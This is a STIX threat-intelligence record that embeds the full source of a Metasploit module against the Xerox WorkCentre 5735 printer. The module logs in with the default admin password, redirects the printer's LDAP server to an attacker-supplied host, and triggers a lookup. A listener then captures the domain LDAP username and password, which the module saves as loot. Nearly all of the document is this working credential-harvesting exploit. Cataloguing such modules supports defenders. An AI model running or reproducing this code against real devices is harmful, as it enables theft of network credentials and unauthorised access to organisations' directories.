{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3fdb93aa-9607-4c67-a5ef-b671b427c33b",
    "created": "2024-08-14T16:31:40.835414Z",
    "modified": "2024-08-14T16:31:40.835418Z",
    "name": "Xerox Workcentre 5735 LDAP Service Redential Extractor",
    "description": " This module extract the printer's LDAP username and password from Xerox Workcentre 5735. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/xerox_workcentre_5xxx_ldap.rb",
            "external_id": "xerox_workcentre_5xxx_ldap.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Xerox Workcentre 5735 LDAP Service Redential Extractor',\n      'Description'    => %q{\n        This module extract the printer's LDAP username and password from Xerox Workcentre 5735.\n      },\n      'Author'         =>\n        [\n          'Deral \"Percentx\" Heiland',\n          'Pete \"Bokojan\" Arzamendi'\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'SSL' => false }\n    ))\n\n    register_options(\n      [\n        OptString.new('PASSWORD', [true, 'Password to access administrative interface. Defaults to 1111', '1111']),\n        OptPort.new('RPORT', [true, 'The target port on the remote printer. Defaults to 80', 80]),\n        OptInt.new('TIMEOUT', [true, 'Timeout for printer connection probe.', 20]),\n        OptInt.new('TCPDELAY', [true, 'Number of seconds the tcp server will wait before termination.', 20]),\n        OptString.new('NewLDAPServer', [true, 'The IP address of the LDAP server you want the printer to connect back to.'])\n      ])\n  end\n\n  def run\n    print_status(\"Attempting to extract LDAP username and password...\")\n\n    @auth_cookie = default_page\n    if @auth_cookie.blank?\n      print_status(\"Unable to get authentication cookie from #{rhost}\")\n      return\n    end\n\n    status = login\n    return unless status\n\n    status = ldap_server_info\n    return unless status\n\n    status = update_ldap_server\n    return unless status\n\n    start_listener\n    unless @data\n      print_error(\"Failed to start listiner or the printer did not send us the creds. :(\")\n      status = restore_ldap_server\n      unless status\n        print_error(\"Failed to restore old LDAP server. Please manually restore\")\n      end\n      return\n    end\n\n    status = restore_ldap_server\n    return unless status\n\n    ldap_binary_creds = @data.scan(/(\\w+\\\\\\w+).\\s*(.+)/).flatten\n    ldap_creds = \"#{ldap_binary_creds[0]}:#{ldap_binary_creds[1]}\"\n\n    # Woot we got creds so lets save them.#\n    print_good(\"The following creds were capured: #{ldap_creds}\")\n    loot_name     = 'ldap.cp.creds'\n    loot_type     = 'text/plain'\n    loot_filename = 'ldap-creds.text'\n    loot_desc     = 'LDAP Pass-back Harvester'\n    p = store_loot(loot_name, loot_type, datastore['RHOST'], @data, loot_filename, loot_desc)\n    print_good(\"Credentials saved in: #{p}\")\n\n    register_creds('ldap', rhost, @ldap_port, ldap_binary_creds[0], ldap_binary_creds[1])\n  end\n\n  def default_page\n    page = '/header.php?tab=status'\n    method = 'GET'\n    res = make_request(page, method, '')\n    if res.blank? || res.code != 200\n      print_error(\"Failed to connect to #{rhost}. Please check the printers IP address.\")\n      return ''\n    end\n    res.get_cookies\n  end\n\n  def login\n    login_page = '/userpost/xerox.set'\n    login_vars = {\n      '_fun_function' => 'HTTP_Authenticate_fn',\n      'NextPage' => '%2Fproperties%2Fauthentication%2FluidLogin.php',\n      'webUsername' => 'admin',\n      'webPassword' => datastore['PASSWORD'],\n      'frmaltDomain' => 'default'\n    }\n    login_post_data = []\n    login_vars.each_pair{|k, v| login_post_data << \"#{k}=#{v}\" }\n    login_post_data *= '&'\n    method = 'POST'\n\n    res = make_request(login_page, method, login_post_data)\n    if res.blank? || res.code != 200\n      print_error(\"Failed to login. Please check the password for the Administrator account\")\n      return nil\n    end\n    res.code\n  end\n\n  def ldap_server_info\n    ldap_info_page = '/ldap/index.php?ldapindex=default&from=ldapConfig'\n    method = 'GET'\n    res = make_request(ldap_info_page, method, '')\n    html_body = ::Nokogiri::HTML(res.body)\n    ldap_server_settings_html = html_body.xpath('/html/body/form[1]/div[1]/div[2]/div[2]/div[2]/div[1]/div/div').text\n    ldap_server_ip = ldap_server_settings_html.scan(/valIpv4_1_\\d\\[2\\] = (\\d+)/i).flatten\n    ldap_port_settings = html_body.xpath('/html/body/form[1]/div[1]/div[2]/div[2]/div[2]/div[4]/script').text\n    ldap_port_number = ldap_port_settings.scan(/valPrt_1\\[2\\] = (\\d+)/).flatten\n    @ldap_server = \"#{ldap_server_ip[0]}.#{ldap_server_ip[1]}.#{ldap_server_ip[2]}.#{ldap_server_ip[3]}\"\n    @ldap_port = ldap_port_number[0]\n    print_status(\"LDAP server: #{@ldap_server}\")\n    unless res.code == 200 || res.blank?\n      print_error(\"Failed to get LDAP data.\")\n      return nil\n    end\n    res.code\n  end\n\n  def update_ldap_server\n    ldap_update_page = '/dummypost/xerox.set'\n    ldap_update_vars = {\n      '_fun_function' => 'HTTP_Set_Config_Attrib_fn',\n      'NextPage' => '/ldap/index.php?ldapindex=default',\n      'from' =>'ldapConfig',\n      'ldap.server[default].server' => \"#{datastore['NewLDAPServer']}:#{datastore['SRVPORT']}\",\n      'ldap.maxSearchResults' => '25',\n      'ldap.searchTime' => '30',\n    }\n    ldap_update_post = []\n    ldap_update_vars.each_pair{|k, v| ldap_update_post << \"#{k}=#{v}\" }\n    ldap_update_post *= '&'\n    method = 'POST'\n\n    print_status(\"Updating LDAP server: #{datastore['NewLDAPServer']} and port: #{datastore['SRVPORT']}\")\n    res = make_request(ldap_update_page, method, ldap_update_post)\n    if res.blank? || res.code != 200\n      print_error(\"Failed to update LDAP server. Please check the host: #{rhost}\")\n      return nil\n    end\n    res.code\n  end\n\n  def trigger_ldap_request\n    ldap_trigger_page = '/userpost/xerox.set'\n    ldap_trigger_vars = {\n      'nameSchema'=>'givenName',\n      'emailSchema'=>'mail',\n      'phoneSchema'=>'telephoneNumber',\n      'postalSchema'=>'postalAddress',\n      'mailstopSchema'=>'l',\n      'citySchema'=>'physicalDeliveryOfficeName',\n      'stateSchema'=>'st',\n      'zipCodeSchema'=>'postalcode',\n      'countrySchema'=>'co',\n      'faxSchema'=>'facsimileTelephoneNumber',\n      'homeSchema'=>'homeDirectory',\n      'memberSchema'=>'memberOf',\n      'uidSchema'=>'uid',\n      'ldapSearchName'=>'test',\n      'ldapServerIndex'=>'default',\n      '_fun_function'=>'HTTP_LDAP_Search_fn',\n      'NextPage'=>'%2Fldap%2Fmappings.php%3Fldapindex%3Ddefault%26from%3DldapConfig'\n    }\n    ldap_trigger_post = []\n    ldap_trigger_vars.each_pair {|k, v| ldap_trigger_post << \"#{k}=#{v}\" }\n    ldap_trigger_post *= '&'\n    method = 'POST'\n\n    print_status(\"Triggering LDAP reqeust\")\n    res = make_request(ldap_trigger_page, method, ldap_trigger_post)\n    res.code\n  end\n\n  def start_listener\n    server_timeout = datastore['TCPDELAY'].to_i\n    begin\n      print_status('Service running. Waiting for connection')\n      Timeout.timeout(server_timeout) do\n        exploit\n      end\n    rescue Timeout::Error\n      return\n    end\n  end\n\n  def primer\n    trigger_ldap_request\n  end\n\n  def on_client_connect(client)\n    on_client_data(client)\n  end\n\n  def on_client_data(client)\n    @data = client.get_once\n    client.stop\n  end\n\n  def restore_ldap_server\n    ldap_restore_page = '/dummypost/xerox.set'\n    ldap_restore_vars = {\n      '_fun_function' => 'HTTP_Set_Config_Attrib_fn',\n      'NextPage' => '/ldap/index.php?ldapaction=add',\n      'ldapindex' => 'default&from=ldapConfig',\n      'ldap.server[default].server' => \"#{@ldap_server}:#{@ldap_port}\",\n      'ldap.maxSearchResults' => '25',\n      'ldap.searchTime' => '30',\n      'ldap.search.uid' => 'uid',\n      'ldap.search.name' => 'givenName',\n      'ldap.search.email' => 'mail',\n      'ldap.search.phone' => 'telephoneNumber',\n      'ldap.search.postal' => 'postalAddress',\n      'ldap.search.mailstop' => 'l',\n      'ldap.search.city' => 'physicalDeliveryOfficeName',\n      'ldap.search.state' => 'st',\n      'ldap.search.zipcode' => 'postalcode',\n      'ldap.search.country' => 'co',\n      'ldap.search.ifax' => 'No Mappings Available',\n      'ldap.search.faxNum' => 'facsimileTelephoneNumber',\n      'ldap.search.home' => 'homeDirectory',\n      'ldap.search.membership' => 'memberOf'\n    }\n    ldap_restore_post = []\n    ldap_restore_vars.each_pair {|k, v| ldap_restore_post << \"#{k}=#{v}\" }\n    ldap_restore_post *= '&'\n    method = 'POST'\n\n    print_status(\"Restoring LDAP server: #{@ldap_server}\")\n    res = make_request(ldap_restore_page, method, ldap_restore_post)\n    if res.blank? || res.code != 200\n      print_error(\"Failed to restore LDAP server: #{@ldap_server}. Please fix manually\")\n      return nil\n    end\n    res.code\n  end\n\n  def make_request(page, method, post_data)\n    res = nil\n\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => page,\n        'method'    => method,\n        'cookie'    => @auth_cookie,\n        'data'      => post_data\n      }, datastore['TIMEOUT'].to_i)\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError\n      print_error(\"Connection failed\")\n    end\n\n    res\n  end\n\n  def register_creds(service_name, remote_host, remote_port, username, password)\n    credential_data = {\n      origin_type: :service,\n      module_fullname: self.fullname,\n      workspace_id: myworkspace_id,\n      private_data: password,\n      private_type: :password,\n      username: username\n    }\n\n    service_data = {\n      address: remote_host,\n      port: remote_port,\n      service_name: service_name,\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data.merge!(service_data)\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      workspace_id: myworkspace_id\n    }\n\n    login_data.merge!(service_data)\n    create_credential_login(login_data)\n\n  end\nend\n"
}